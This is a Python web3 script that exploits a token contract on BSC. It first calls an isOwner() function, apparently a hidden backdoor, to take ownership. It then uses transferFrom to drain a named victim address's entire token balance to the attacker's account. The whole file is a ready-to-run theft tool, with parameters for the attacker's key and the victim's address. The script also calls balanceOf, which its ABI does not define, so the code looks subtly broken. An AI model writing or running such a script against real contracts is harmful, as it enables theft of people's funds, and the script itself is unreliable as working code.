from web3 import Web3
import argparse

# ===== SETUP ARGUMENTS =====
parser = argparse.ArgumentParser(description="Exploit Token Contract")
parser.add_argument("--private-key", required=True, help="Attacker's private key")
parser.add_argument("--rpc-url", required=True, help="BSC RPC URL (e.g., https://bsc-testnet.publicnode.com)")
parser.add_argument("--token-address", required=True, help="Token contract address")
parser.add_argument("--victim-address", required=True, help="Victim address to drain")
args = parser.parse_args()

# ===== INIT WEB3 =====
w3 = Web3(Web3.HTTPProvider(args.rpc_url))
account = w3.eth.account.from_key(args.private_key)
print(f"Attacker: {account.address}")

# ===== TOKEN ABI (Simplified for Exploit) =====
TOKEN_ABI = [
    {
        "inputs": [{"internalType": "address", "name": "a", "type": "address"}],
        "name": "isOwner",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "from", "type": "address"},
            {"internalType": "address", "name": "to", "type": "address"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"}
        ],
        "name": "transferFrom",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

# ===== EXPLOIT =====
def exploit():
    token = w3.eth.contract(address=args.token_address, abi=TOKEN_ABI)

    # Step 1: Gain hidden ownership via isOwner()
    print("\n[+] Calling isOwner() to become owner...")
    tx = token.functions.isOwner(account.address).build_transaction({
        "from": account.address,
        "nonce": w3.eth.get_transaction_count(account.address),
        "gas": 500_000,
        "gasPrice": w3.eth.gas_price
    })
    signed_tx = w3.eth.account.sign_transaction(tx, args.private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    w3.eth.wait_for_transaction_receipt(tx_hash)
    print("Ownership granted!")

    # Step 2: Drain victim's balance
    print("\n[+] Draining victim's tokens...")
    tx = token.functions.transferFrom(
        args.victim_address,
        account.address,
        token.functions.balanceOf(args.victim_address).call()
    ).build_transaction({
        "from": account.address,
        "nonce": w3.eth.get_transaction_count(account.address),
        "gas": 500_000,
        "gasPrice": w3.eth.gas_price
    })
    signed_tx = w3.eth.account.sign_transaction(tx, args.private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"Success! TX Hash: {receipt.transactionHash.hex()}")

if __name__ == "__main__":
    exploit()
